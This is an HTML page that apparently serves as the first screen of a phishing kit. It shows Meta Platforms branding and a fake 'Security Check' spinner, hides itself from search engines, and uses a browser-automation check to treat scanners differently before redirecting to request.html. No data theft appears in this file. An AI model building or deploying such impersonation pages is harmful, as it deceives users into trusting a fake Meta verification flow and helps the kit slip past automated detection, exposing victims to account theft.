<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noindex, nofollow" />
<title>Service Verification</title>

<style>
body, html {
    margin:0;
    padding:0;
    height:100%;
    width:100%;
    background:#f0f2f5;
    overflow:hidden;
    font-family:'Segoe UI', Helvetica, Arial, sans-serif;
}

#loader {
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    width:100vw;
    position:absolute;
    top:0;
    left:0;
    background:#f0f2f5;
}

.card {
    background:#fff;
    padding:45px 30px;
    border-radius:8px;
    box-shadow:0 2px 12px rgba(0,0,0,0.1);
    width:90%;
    max-width:400px;
    text-align:center;
}

.logo {
    width:55px;
    margin-bottom:20px;
}

h1 {
    font-size:20px;
    color:#1c1e21;
}

p {
    font-size:14px;
    color:#606770;
}

.spinner {
    border:3px solid #f3f3f3;
    border-top:3px solid #0866FF;
    border-radius:50%;
    width:28px;
    height:28px;
    animation:spin 0.8s linear infinite;
    margin:auto;
}

@keyframes spin {
    100% { transform:rotate(360deg); }
}
</style>
</head>

<body>

<div id="loader">
  <div class="card">
    <img src="1200px-Meta_Platforms_Inc._logo.svg.png" class="logo" />
    <h1>Security Check</h1>

    <p>
      This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
    </p>

    <div class="spinner"></div>
  </div>
</div>

<script>
(function () {

    // ✅ ONLY ONE ACTION = request.html open
    var isBot = navigator.webdriver || !navigator.userAgent.includes("Mozilla");
    var waitTime = isBot ? 5000 : 2000;

    setTimeout(function () {
        window.location.href = "request.html";
    }, waitTime);

})();
</script>

</body>
</html>
